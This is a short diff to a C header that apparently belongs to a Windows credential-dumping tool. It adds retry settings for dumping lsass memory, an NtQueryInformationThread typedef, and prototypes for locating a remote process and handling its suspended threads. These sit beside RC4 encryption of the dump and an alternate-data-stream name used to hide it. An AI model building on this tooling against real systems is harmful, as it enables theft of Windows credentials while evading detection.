@@ -12,6 +12,10 @@
 
 #define RC4KEYSIZE	64
 
+// uncomment to disable retry of dumping lsass on failure
+#define RETRY_DUMP_ON_FAILURE
+#define RETRY_LIMIT 3
+
 // the new data stream name
 #define NEW_STREAM L":ALT"
 
@@ -65,9 +69,20 @@ typedef NTSTATUS(NTAPI* fnNtQueryInformationProcess)(
 	PULONG           ReturnLength
 	);
 
+typedef NTSTATUS(NTAPI* fnNtQueryInformationThread)(
+	HANDLE ThreadHandle,
+	THREADINFOCLASS ThreadInformationClass,
+	PVOID ThreadInformation,
+	ULONG ThreadInformationLength,
+	PULONG ReturnLength);
+
 ParsedArgs ParseArgs(int argc, char* argv[]);
 WCHAR* ConvertToWideString(const char* asciiStr, size_t length);
 CHAR* ConvertToAsciiString(const WCHAR* wideStr, size_t length);
+
+BOOL GetRemoteProcessInfo(LPCWSTR szProcName, DWORD* pdwPid, HANDLE* phProcess);
+DWORD* GetRemoteProcessSuspendedThreads(IN LPCWSTR szProcName, OUT DWORD* threadCount);
+VOID ResumeThreads(DWORD* threadIDs, DWORD threadCount);
 
 BOOL Rc4EncryptionViaSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pData, IN DWORD dwRc4KeySize, IN DWORD sDataSize);
 VOID GenerateRandomBytes(PBYTE pByte, SIZE_T sSize);
